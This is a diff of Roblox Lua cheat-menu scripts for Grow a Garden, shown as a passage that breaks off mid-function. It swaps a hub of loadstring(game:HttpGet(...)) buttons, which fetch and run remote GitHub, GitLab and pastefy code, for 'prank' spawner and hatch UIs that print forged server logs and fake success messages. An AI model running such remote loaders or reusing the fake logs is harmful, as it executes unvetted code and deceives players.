@@ -1,284 +1,760 @@
 loadstring(game:HttpGet("https://pastefy.app/jCWir5ty/raw"))()
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
+--[[
+# Usage of methods (for developers)
+```lua
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkdark/dark/-/raw/main/Spawner.lua"))()
+Spawner.GetPets() -- Returns a table of supported pets
+Spawner.GetSeeds() -- Returns a table of supported seeds 
+Spawner.GetEggs() -- Returns a table of supported eggs
+Spawner.SpawnPet("Raccoon", 1, 2) -- Spawns a Raccoon with 1 KG and 2 Age
+Spawner.SpawnSeed("Candy Blossom") -- Spawns Candy Blossom
+Spawner.SpawnEgg("Night Egg") -- Spawns Night Egg
+Spawner.Spin("Sunflower") -- Spins Sunflower
+Spawner.Load() -- Loads the Default UI
+```
+
+# Default Loader
+```lua
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkdark/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
+```
+]]
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
+local pg = player:WaitForChild("PlayerGui")
 
--- GUI setup
-local gui = Instance.new("ScreenGui")
-gui.Name = "KuniHubPremiumGUI"
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent = player:WaitForChild("PlayerGui")
-
--- Main frame
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 226)
-frame.Position = UDim2.new(0.5, -110, 0.5, -113)
-frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-frame.BackgroundTransparency = 0.1
-frame.BorderSizePixel = 0
-frame.Parent = gui
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-
--- Warning message at startup
-local warningLabel = Instance.new("TextLabel")
-warningLabel.Size = UDim2.new(1, 0, 0, 20)
-warningLabel.Position = UDim2.new(0, 0, 0, -24)
-warningLabel.BackgroundTransparency = 0.2
-warningLabel.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-warningLabel.Text = "âš GUI is still loading..."
-warningLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-warningLabel.Font = Enum.Font.GothamBold
-warningLabel.TextSize = 14
-warningLabel.Parent = frame
-Instance.new("UICorner", warningLabel).CornerRadius = UDim.new(0, 6)
-
--- Fade out warning after 5 seconds
-spawn(function()
-    wait(5)
-    TweenService:Create(warningLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        TextTransparency = 1,
-        BackgroundTransparency = 1
-    }):Play()
-    wait(0.6)
-    warningLabel:Destroy()
-end)
-
--- RGB glow border
-local glow = Instance.new("Frame")
-glow.Size = UDim2.new(1, 8, 1, 8)
-glow.Position = UDim2.new(0, -4, 0, -4)
-glow.BackgroundColor3 = Color3.fromHSV(0, 1, 1)
-glow.BorderSizePixel = 0
-glow.ZIndex = 0
-glow.Parent = frame
-Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 16)
-
-spawn(function()
-    local hue = 0
-    while gui.Parent do
-        hue = (hue + 0.007) % 1
-        glow.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
-        wait(0.03)
-    end
-end)
-
--- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -70, 0, 32)
-title.Position = UDim2.new(0, 10, 0, 10)
-title.BackgroundTransparency = 1
-title.Text = "Yawi Library"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.Font = Enum.Font.GothamBlack
-title.TextSize = 22
-title.TextStrokeTransparency = 0.6
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = frame
-
--- Footer
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, 0, 0, 16)
-footer.Position = UDim2.new(0, 0, 1, -20)
-footer.BackgroundTransparency = 1
-footer.Text = "Tiktok: @yawiyawiyawiz1"
-footer.TextColor3 = Color3.fromRGB(160, 160, 160)
-footer.Font = Enum.Font.Gotham
-footer.TextSize = 12
-footer.TextXAlignment = Enum.TextXAlignment.Center
-footer.Parent = frame
-
--- Tween helper
-local function TweenInOut(obj, goal, duration)
-    TweenService:Create(obj, TweenInfo.new(duration or 0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), goal):Play()
-end
-
--- Create button (reusable)
-local function createButton(parent, posY, text)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, 0, 0, 26)
-    btn.Position = UDim2.new(0, 0, 0, posY)
-    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    btn.BorderSizePixel = 0
-    btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 15
-    btn.ZIndex = 1
-    btn.Parent = parent
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
-
-    btn.MouseEnter:Connect(function()
-        TweenInOut(btn, {BackgroundTransparency = 0.3}, 0.2)
-    end)
-    btn.MouseLeave:Connect(function()
-        TweenInOut(btn, {BackgroundTransparency = 0}, 0.2)
-    end)
-
-    return btn
-end
-
--- Button 1: Dark Spawner
-local button1 = createButton(frame, 50, "Run Dark Spawner")
-button1.MouseButton1Click:Connect(function()
-	button1.Text = "Loading..."
-	button1.BackgroundTransparency = 0.5
-	local success, err = pcall(function()
-		local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-		Spawner.Load()
+-- utility
+local function notify(title, text, dur)
+	pcall(function()
+		StarterGui:SetCore("SendNotification", {Title = title, Text = text, Duration = dur or 3})
 	end)
-	button1.Text = success and "Loaded!" or "Failed!"
-	if not success then warn("[Kuni Hub] Error: " .. tostring(err)) end
-	wait(2)
-	button1.Text = "Run Dark Spawner"
-	button1.BackgroundTransparency = 0
+end
+
+-- root gui
+local gui = Instance.new("ScreenGui")
+gui.Name = "AdrianFakeSpawner"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = pg
+
+-- glass panel
+local panel = Instance.new("Frame")
+panel.Size = UDim2.fromOffset(460, 300)
+panel.Position = UDim2.new(0.5, -230, 0.5, -150)
+panel.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+panel.BackgroundTransparency = 0.15
+panel.BorderSizePixel = 0
+panel.Parent = gui
+panel.ClipsDescendants = true
+panel.Visible = true
+panel.AnchorPoint = Vector2.new(0.5, 0.5)
+panel:SetAttribute("Draggable", true)
+
+local corner = Instance.new("UICorner", panel)
+corner.CornerRadius = UDim.new(0, 16)
+
+local uiStroke = Instance.new("UIStroke", panel)
+uiStroke.Thickness = 1.6
+uiStroke.Color = Color3.fromRGB(120, 100, 255)
+uiStroke.Transparency = 0.35
+
+local title = Instance.new("TextLabel", panel)
+title.Size = UDim2.new(1, -20, 0, 36)
+title.Position = UDim2.fromOffset(10, 10)
+title.BackgroundTransparency = 1
+title.Text = "Adrian Spawner â€¢ v3.7 private"
+title.Font = Enum.Font.GothamSemibold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(220, 220, 255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local line = Instance.new("Frame", panel)
+line.Size = UDim2.new(1, -20, 0, 1)
+line.Position = UDim2.fromOffset(10, 48)
+line.BackgroundColor3 = Color3.fromRGB(70, 60, 140)
+line.BackgroundTransparency = 0.4
+
+-- inputs
+local function mkLabel(parent, text, y)
+	local l = Instance.new("TextLabel")
+	l.Parent = parent
+	l.Size = UDim2.fromOffset(120, 28)
+	l.Position = UDim2.fromOffset(16, y)
+	l.BackgroundTransparency = 1
+	l.Text = text
+	l.Font = Enum.Font.Gotham
+	l.TextSize = 14
+	l.TextColor3 = Color3.fromRGB(200, 200, 220)
+	l.TextXAlignment = Enum.TextXAlignment.Left
+	return l
+end
+
+local function mkInput(parent, placeholder, y)
+	local b = Instance.new("TextBox")
+	b.Parent = parent
+	b.Size = UDim2.fromOffset(300, 30)
+	b.Position = UDim2.fromOffset(140, y)
+	b.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
+	b.TextColor3 = Color3.fromRGB(230, 230, 240)
+	b.PlaceholderText = placeholder
+	b.ClearTextOnFocus = false
+	b.Font = Enum.Font.Gotham
+	b.TextSize = 14
+	b.BorderSizePixel = 0
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
+	return b
+end
+
+mkLabel(panel, "Pet Name", 64)
+local petInput = mkInput(panel, "Kitsune, Raccoon, Dragonfly, etc.", 60)
+
+mkLabel(panel, "Weight KG", 100)
+local kgInput = mkInput(panel, "1 - 500", 96)
+
+mkLabel(panel, "Age", 136)
+local ageInput = mkInput(panel, "0 - 50", 132)
+
+-- console
+local console = Instance.new("TextLabel", panel)
+console.Size = UDim2.new(1, -20, 0, 84)
+console.Position = UDim2.fromOffset(10, 170)
+console.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
+console.TextXAlignment = Enum.TextXAlignment.Left
+console.TextYAlignment = Enum.TextYAlignment.Top
+console.TextWrapped = true
+console.Text = ""
+console.Font = Enum.Font.Code
+console.TextSize = 13
+console.TextColor3 = Color3.fromRGB(170, 255, 170)
+Instance.new("UICorner", console).CornerRadius = UDim.new(0, 8)
+
+-- progress bar
+local bar = Instance.new("Frame", panel)
+bar.Size = UDim2.new(1, -20, 0, 10)
+bar.Position = UDim2.fromOffset(10, 264)
+bar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+bar.BorderSizePixel = 0
+Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 6)
+
+local fill = Instance.new("Frame", bar)
+fill.Size = UDim2.new(0, 0, 1, 0)
+fill.BackgroundColor3 = Color3.fromRGB(140, 85, 255)
+fill.BorderSizePixel = 0
+Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 6)
+
+-- buttons
+local spawnBtn = Instance.new("TextButton", panel)
+spawnBtn.Size = UDim2.fromOffset(180, 32)
+spawnBtn.Position = UDim2.fromOffset(16, 226)
+spawnBtn.Text = "SPAWN PET"
+spawnBtn.Font = Enum.Font.GothamSemibold
+spawnBtn.TextSize = 14
+spawnBtn.TextColor3 = Color3.fromRGB(250, 250, 255)
+spawnBtn.BackgroundColor3 = Color3.fromRGB(70, 60, 140)
+spawnBtn.AutoButtonColor = false
+Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0, 10)
+
+local dupeBtn = Instance.new("TextButton", panel)
+dupeBtn.Size = UDim2.fromOffset(180, 32)
+dupeBtn.Position = UDim2.fromOffset(204, 226)
+dupeBtn.Text = "DUPE x10"
+dupeBtn.Font = Enum.Font.GothamSemibold
+dupeBtn.TextSize = 14
+dupeBtn.TextColor3 = Color3.fromRGB(250, 250, 255)
+dupeBtn.BackgroundColor3 = Color3.fromRGB(90, 70, 180)
+dupeBtn.AutoButtonColor = false
+Instance.new("UICorner", dupeBtn).CornerRadius = UDim.new(0, 10)
+
+-- draggable
+do
+	local dragging = false
+	local offset
+	panel.InputBegan:Connect(function(input)
+		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
+			dragging = true
+			offset = input.Position
+		end
+	end)
+	panel.InputEnded:Connect(function(input)
+		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
+			dragging = false
+		end
+	end)
+	game:GetService("UserInputService").InputChanged:Connect(function(input)
+		if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
+			local delta = input.Position - offset
+			offset = input.Position
+			panel.Position = UDim2.new(panel.Position.X.Scale, panel.Position.X.Offset + delta.X,
+				panel.Position.Y.Scale, panel.Position.Y.Offset + delta.Y)
+		end
+	end)
+end
+
+-- fake pet â€œshadowâ€ near the player (pure client visual)
+local function showFakeShadow(name)
+	local char = player.Character or player.CharacterAdded:Wait()
+	if not char:FindFirstChild("HumanoidRootPart") then return end
+	local attach = Instance.new("Part")
+	attach.Name = "PetShadow"
+	attach.Size = Vector3.new(1,1,1)
+	attach.Transparency = 1
+	attach.Anchored = false
+	attach.CanCollide = false
+	attach.Parent = workspace
+	local weld = Instance.new("WeldConstraint", attach)
+	weld.Part0 = attach
+	weld.Part1 = char:WaitForChild("HumanoidRootPart")
+	attach.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(2, 0, -2)
+
+	local billboard = Instance.new("BillboardGui", attach)
+	billboard.Size = UDim2.fromOffset(140, 40)
+	billboard.StudsOffset = Vector3.new(0, 3, 0)
+	billboard.AlwaysOnTop = true
+
+	local tag = Instance.new("TextLabel", billboard)
+	tag.Size = UDim2.fromScale(1,1)
+	tag.BackgroundTransparency = 1
+	tag.Font = Enum.Font.GothamBold
+	tag.TextSize = 16
+	tag.TextColor3 = Color3.fromRGB(255, 215, 120)
+	tag.TextStrokeTransparency = 0.5
+	tag.Text = name .. "  (client)"
+end
+
+-- fake console log helper
+local function log(lineText)
+	console.Text = (console.Text .. "\n" .. lineText):sub(-1200)
+end
+
+-- progress anim
+local function animateProgress(t)
+	fill.Size = UDim2.new(0, 0, 1, 0)
+	local tw = TweenService:Create(fill, TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)})
+	tw:Play()
+end
+
+-- prank reveal
+local revealed = false
+local function reveal()
+	if revealed then return end
+	revealed = true
+	notify("pranked", "this is a pet spawner visual!")
+	log("[WARN] server rejected instance build id mismatch")
+	log("[INFO] visual mode detected applying client overlay only")
+	title.Text = "Adrian Spawner â€¢ VISUAL ONLY"
+end
+
+-- main fake flow
+local function fakeSpawn(mult)
+	mult = mult or 1
+	local petName = petInput.Text ~= "" and petInput.Text or "Kitsune"
+	local kg = tonumber(kgInput.Text) or math.random(3, 150)
+	local age = tonumber(ageInput.Text) or math.random(1, 50)
+
+	log(string.format("[INFO] preparing blueprint  pet=%s  kg=%d  age=%d", petName, kg, age))
+	log("[SEC] validating client token...")
+	animateProgress(1.2); task.wait(0.6); log("[OK] token accepted")
+	task.wait(0.7)
+	log("[NET] requesting server pipeline..."); task.wait(0.5)
+	log("[OK] pipeline route=egg/spawn v2"); task.wait(0.4)
+	log("[BUILD] composing mesh & traits..."); task.wait(0.8)
+	log("[SYNC] pushing " .. tostring(mult) .. " instance(s)..."); task.wait(0.6)
+	log("[SYNC] awaiting ack..."); task.wait(0.7)
+
+	-- look super legit
+	notify("spawning", petName .. " x" .. tostring(mult) .. " â€¢ kg " .. kg .. " â€¢ age " .. age, 3)
+	showFakeShadow(petName)
+
+	-- after a moment show â€œsuccessâ€ then quietly reveal prank
+	task.wait(0.8)
+	log("[OK] ack received id=" .. string.format("%06d", math.random(100000, 999999)))
+	task.wait(0.4)
+	log("[DONE] spawn complete")
+	notify("success", petName .. " spawned locally", 3)
+
+	-- reveal after 20s automatically so the joke lands later
+	task.delay(20, reveal)
+end
+
+spawnBtn.MouseButton1Click:Connect(function()
+	spawnBtn.Text = "WORKING..."
+	dupeBtn.Active = false; spawnBtn.Active = false
+	fakeSpawn(1)
+	task.wait(1.2)
+	spawnBtn.Text = "SPAWN PET"; dupeBtn.Active = true; spawnBtn.Active = true
 end)
--- Button 2
-local button2 = createButton(frame, 82, "Run Project Reverse")
-button2.MouseButton1Click:Connect(function()
-    button2.Text = "Loading..."
-    button2.BackgroundTransparency = 0.5
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
-    end)
-    button2.Text = success and "Loaded!" or "Failed!"
-    if not success then warn("[Kuni Hub] Error: "..tostring(err)) end
-    wait(2)
-    button2.Text = "Run Project Reverse"
-    button2.BackgroundTransparency = 0
+
+dupeBtn.MouseButton1Click:Connect(function()
+	dupeBtn.Text = "DUPING..."
+	dupeBtn.Active = false; spawnBtn.Active = false
+	fakeSpawn(10)
+	task.wait(1.2)
+	dupeBtn.Text = "DUPE x10"; dupeBtn.Active = true; spawnBtn.Active = true
 end)
 
--- Button 3
-local button3 = createButton(frame, 114, "Run Yawi X Hub")
-button3.MouseButton1Click:Connect(function()
-    button3.Text = "Loading..."
-    button3.BackgroundTransparency = 0.5
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/FullFeaturesObsa"))()
-    end)
-    button3.Text = success and "Loaded!" or "Failed!"
-    if not success then warn("[Kuni Hub] Error: "..tostring(err)) end
-    wait(2)
-    button3.Text = "Run Yawi X Hub"
-    button3.BackgroundTransparency = 0
+-- key to reveal early
+game:GetService("UserInputService").InputBegan:Connect(function(i, gpe)
+	if gpe then return end
+	if i.KeyCode == Enum.KeyCode.G then
+		reveal()
+	end
 end)
 
--- Button 4
-local button4 = createButton(frame, 146, "Open Egg Detector")
-button4.MouseButton1Click:Connect(function()
-    button4.Text = "Loading..."
-    button4.BackgroundTransparency = 0.5
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/EGG%20DETECTOR1"))()
-    end)
-    button4.Text = success and "Loaded!" or "Failed!"
-    if not success then warn("[Kuni Hub] Error: "..tostring(err)) end
-    wait(2)
-    button4.Text = "Open Egg Detector"
-    button4.BackgroundTransparency = 0
+notify("Adrian Spawner", "loaded private build v3.7", 4)
+log("[BOOT] attaching to player gui...")
+task.wait(0.3)
+log("[OK] hook established")
+task.wait(0.2)
+log("[INFO] ready")--[[
+  Adrian Fake Visual Hatch v1.0  harmless prank only
+  - fake egg model crack animation confetti rarity roll ui logs
+  - no remotes no server write no real pets spawned
+  - press H to show gui anytime
+]]
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+local pg = player:WaitForChild("PlayerGui")
+
+local function notify(t, m, d)
+	pcall(function()
+		StarterGui:SetCore("SendNotification", {Title = t, Text = m, Duration = d or 3})
+	end)
+end
+
+local function sysmsg(text)
+	pcall(function()
+		StarterGui:SetCore("ChatMakeSystemMessage", {
+			Text = text,
+			Color = Color3.fromRGB(255, 235, 140),
+			Font = Enum.Font.SourceSansBold,
+			TextSize = 18
+		})
+	end)
+end
+
+-- gui root
+local gui = Instance.new("ScreenGui")
+gui.Name = "AdrianFakeHatch"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = pg
+
+-- main panel
+local panel = Instance.new("Frame")
+panel.Size = UDim2.fromOffset(460, 320)
+panel.Position = UDim2.new(0.5, -230, 0.5, -160)
+panel.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
+panel.BorderSizePixel = 0
+panel.Parent = gui
+panel.AnchorPoint = Vector2.new(0.5, 0.5)
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 16)
+local stroke = Instance.new("UIStroke", panel)
+stroke.Thickness = 1.6
+stroke.Color = Color3.fromRGB(140, 85, 255)
+stroke.Transparency = 0.25
+
+local title = Instance.new("TextLabel", panel)
+title.Size = UDim2.new(1, -20, 0, 36)
+title.Position = UDim2.fromOffset(10, 10)
+title.BackgroundTransparency = 1
+title.Text = "Adrian Hatch â€¢ v2.4 private"
+title.Font = Enum.Font.GothamSemibold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(220, 220, 255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local sep = Instance.new("Frame", panel)
+sep.Size = UDim2.new(1, -20, 0, 1)
+sep.Position = UDim2.fromOffset(10, 48)
+sep.BackgroundColor3 = Color3.fromRGB(70, 60, 140)
+sep.BackgroundTransparency = 0.4
+
+-- inputs
+local function mkLabel(p, t, y)
+	local l = Instance.new("TextLabel")
+	l.Parent = p
+	l.Size = UDim2.fromOffset(120, 28)
+	l.Position = UDim2.fromOffset(16, y)
+	l.BackgroundTransparency = 1
+	l.Text = t
+	l.Font = Enum.Font.Gotham
+	l.TextSize = 14
+	l.TextColor3 = Color3.fromRGB(200,200,220)
+	l.TextXAlignment = Enum.TextXAlignment.Left
+	return l
+end
+local function mkInput(p, ph, y)
+	local b = Instance.new("TextBox")
+	b.Parent = p
+	b.Size = UDim2.fromOffset(300, 30)
+	b.Position = UDim2.fromOffset(140, y)
+	b.BackgroundColor3 = Color3.fromRGB(32, 32, 44)
+	b.TextColor3 = Color3.fromRGB(240, 240, 250)
+	b.PlaceholderText = ph
+	b.ClearTextOnFocus = false
+	b.Font = Enum.Font.Gotham
+	b.TextSize = 14
+	b.BorderSizePixel = 0
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
+	return b
+end
+
+mkLabel(panel, "Egg Type", 64)
+local eggInput = mkInput(panel, "Common Egg Mythical Egg Paradise Egg", 60)
+
+mkLabel(panel, "Target Pet", 100)
+local petInput = mkInput(panel, "Kitsune Raccoon Dragonfly etc", 96)
+
+mkLabel(panel, "Hatch Speed", 136)
+local spdInput = mkInput(panel, "normal fast turbo", 132)
+
+-- console box
+local console = Instance.new("TextLabel", panel)
+console.Size = UDim2.new(1, -20, 0, 90)
+console.Position = UDim2.fromOffset(10, 170)
+console.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
+console.TextXAlignment = Enum.TextXAlignment.Left
+console.TextYAlignment = Enum.TextYAlignment.Top
+console.TextWrapped = true
+console.Font = Enum.Font.Code
+console.TextSize = 13
+console.TextColor3 = Color3.fromRGB(170,255,170)
+Instance.new("UICorner", console).CornerRadius = UDim.new(0, 8)
+
+local function log(t)
+	console.Text = (console.Text .. "\n" .. t):sub(-1400)
+end
+
+-- progress bar
+local bar = Instance.new("Frame", panel)
+bar.Size = UDim2.new(1, -20, 0, 10)
+bar.Position = UDim2.fromOffset(10, 274)
+bar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+bar.BorderSizePixel = 0
+Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 6)
+local fill = Instance.new("Frame", bar)
+fill.Size = UDim2.new(0, 0, 1, 0)
+fill.BackgroundColor3 = Color3.fromRGB(140, 85, 255)
+fill.BorderSizePixel = 0
+Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 6)
+
+local hatchBtn = Instance.new("TextButton", panel)
+hatchBtn.Size = UDim2.fromOffset(200, 34)
+hatchBtn.Position = UDim2.fromOffset(16, 230)
+hatchBtn.Text = "HATCH EGG"
+hatchBtn.Font = Enum.Font.GothamSemibold
+hatchBtn.TextSize = 14
+hatchBtn.TextColor3 = Color3.fromRGB(255,255,255)
+hatchBtn.BackgroundColor3 = Color3.fromRGB(90, 70, 180)
+hatchBtn.AutoButtonColor = false
+Instance.new("UICorner", hatchBtn).CornerRadius = UDim.new(0, 10)
+
+local multiBtn = Instance.new("TextButton", panel)
+multiBtn.Size = UDim2.fromOffset(200, 34)
+multiBtn.Position = UDim2.fromOffset(244, 230)
+multiBtn.Text = "HATCH x3"
+multiBtn.Font = Enum.Font.GothamSemibold
+multiBtn.TextSize = 14
+multiBtn.TextColor3 = Color3.fromRGB(255,255,255)
+multiBtn.BackgroundColor3 = Color3.fromRGB(110, 80, 200)
+multiBtn.AutoButtonColor = false
+Instance.new("UICorner", multiBtn).CornerRadius = UDim.new(0, 10)
+
+-- draggable
+do
+	local dragging, offset
+	panel.InputBegan:Connect(function(i)
+		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			offset = i.Position
+		end
+	end)
+	panel.InputEnded:Connect(function(i)
+		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(i)
+		if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+			local d = i.Position - offset
+			offset = i.Position
+			panel.Position = UDim2.new(panel.Position.X.Scale, panel.Position.X.Offset + d.X,
+				panel.Position.Y.Scale, panel.Position.Y.Offset + d.Y)
+		end
+	end)
+end
+
+-- rarity table visual only
+local Rarities = {
+	{ name = "Common",    chance = 58 },
+	{ name = "Uncommon",  chance = 24 },
+	{ name = "Rare",      chance = 12 },
+	{ name = "Epic",      chance = 4  },
+	{ name = "Legendary", chance = 1.5},
+	{ name = "Mythic",    chance = 0.5},
+}
+
+local Colors = {
+	Common    = Color3.fromRGB(200, 200, 200),
+	Uncommon  = Color3.fromRGB(120, 220, 120),
+	Rare      = Color3.fromRGB(120, 180, 255),
+	Epic      = Color3.fromRGB(200, 120, 255),
+	Legendary = Color3.fromRGB(255, 200, 90),
+	Mythic    = Color3.fromRGB(255, 110, 110),
+}
+
+-- create a temporary egg near player
+local function createFakeEgg()
+	local char = player.Character or player.CharacterAdded:Wait()
+	local root = char:WaitForChild("HumanoidRootPart")
+
+	local egg = Instance.new("Part")
+	egg.Name = "AdrianFakeEgg"
+	egg.Shape = Enum.PartType.Ball
+	egg.Material = Enum.Material.SmoothPlastic
+	egg.Color = Color3.fromRGB(255, 245, 200)
+	egg.Size = Vector3.new(2.2, 2.2, 2.2)
+	egg.CanCollide = false
+	egg.Anchored = true
+	egg.CFrame = root.CFrame * CFrame.new(0, 3, -4)
+	egg.Parent = workspace
+
+	-- glow ring
+	local ring = Instance.new("SelectionSphere")
+	ring.SurfaceTransparency = 0.6
+	ring.Transparency = 0.5
+	ring.Color3 = Color3.fromRGB(140, 85, 255)
+	ring.Adornee = egg
+	ring.Parent = egg
+
+	-- sparkles
+	local pe = Instance.new("ParticleEmitter", egg)
+	pe.Rate = 12
+	pe.Speed = NumberRange.new(0.5, 1.5)
+	pe.Lifetime = NumberRange.new(0.6, 1.2)
+	pe.Size = NumberSequence.new({NumberSequenceKeypoint.new(0,0.2), NumberSequenceKeypoint.new(1,0)})
+	pe.SpreadAngle = Vector2.new(15, 15)
+
+	return egg
+end
+
+local function crackAnimation(egg, speedMult)
+	speedMult = speedMult or 1
+	local t1 = TweenService:Create(egg, TweenInfo.new(0.4/speedMult, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = egg.Size * 1.15})
+	local t2 = TweenService:Create(egg, TweenInfo.new(0.25/speedMult, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = egg.Size})
+	t1:Play(); t1.Completed:Wait(); t2:Play(); t2.Completed:Wait()
+
+	for i=1, 3 do
+		local flick = TweenService:Create(egg, TweenInfo.new(0.12/speedMult), {Transparency = 0.4})
+		flick:Play(); flick.Completed:Wait()
+		egg.Transparency = 0
+	end
+
+	local shrink = TweenService:Create(egg, TweenInfo.new(0.45/speedMult, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = Vector3.new(0.1,0.1,0.1), Transparency = 1})
+	shrink:Play(); shrink.Completed:Wait()
+end
+
+-- confetti burst
+local function confettiBurst(position, color)
+	local p = Instance.new("Part")
+	p.Anchored = true
+	p.CanCollide = false
+	p.Transparency = 1
+	p.Size = Vector3.new(1,1,1)
+	p.CFrame = CFrame.new(position + Vector3.new(0,2,0))
+	p.Parent = workspace
+
+	local pe = Instance.new("ParticleEmitter", p)
+	pe.Rate = 0
+	pe.EmissionDirection = Enum.NormalId.Top
+	pe.Lifetime = NumberRange.new(0.8, 1.4)
+	pe.Speed = NumberRange.new(8, 16)
+	pe.VelocitySpread = 160
+	pe.Rotation = NumberRange.new(0, 360)
+	pe.RotSpeed = NumberRange.new(-80, 80)
+	pe.Size = NumberSequence.new(0.25)
+	pe.Color = ColorSequence.new(color)
+	pe.Texture = "rbxassetid://243660364" -- small confetti texture
+	pe:Emit(120)
+	game:GetService("Debris"):AddItem(p, 2)
+end
+
+-- floating text
+local function floatText(cf, text, color)
+	local billboard = Instance.new("BillboardGui")
+	billboard.Size = UDim2.fromOffset(220, 40)
+	billboard.AlwaysOnTop = true
+	billboard.StudsOffset = Vector3.new(0, 3, 0)
+	billboard.Parent = workspace.Terrain
+
+	local part = Instance.new("Part")
+	part.Anchored = true
+	part.CanCollide = false
+	part.Transparency = 1
+	part.Size = Vector3.new(1,1,1)
+	part.CFrame = cf
+	part.Parent = workspace
+
+	billboard.Adornee = part
+
+	local label = Instance.new("TextLabel", billboard)
+	label.BackgroundTransparency = 1
+	label.Size = UDim2.fromScale(1,1)
+	label.Font = Enum.Font.GothamBlack
+	label.TextSize = 24
+	label.TextColor3 = color
+	label.TextStrokeTransparency = 0.4
+	label.Text = text
+
+	local t = TweenService:Create(billboard, TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {StudsOffset = Vector3.new(0, 6, 0)})
+	local f = TweenService:Create(label, TweenInfo.new(1.0), {TextTransparency = 1})
+	t:Play(); task.delay(0.4, function() f:Play() end)
+	game:GetService("Debris"):AddItem(part, 1.4)
+	game:GetService("Debris"):AddItem(billboard, 1.5)
+end
+
+-- fake pet model simple orb w name
+local function spawnFakePet(cf, petName, rarity)
+	local sphere = Instance.new("Part")
+	sphere.Name = "AdrianFakePet"
+	sphere.Shape = Enum.PartType.Ball
+	sphere.Material = Enum.Material.Neon
+	sphere.Color = Colors[rarity] or Color3.fromRGB(255, 255, 255)
+	sphere.Size = Vector3.new(1.7,1.7,1.7)
+	sphere.CanCollide = false
+	sphere.Anchored = true
+	sphere.CFrame = cf * CFrame.new(0, 1.5, 0)
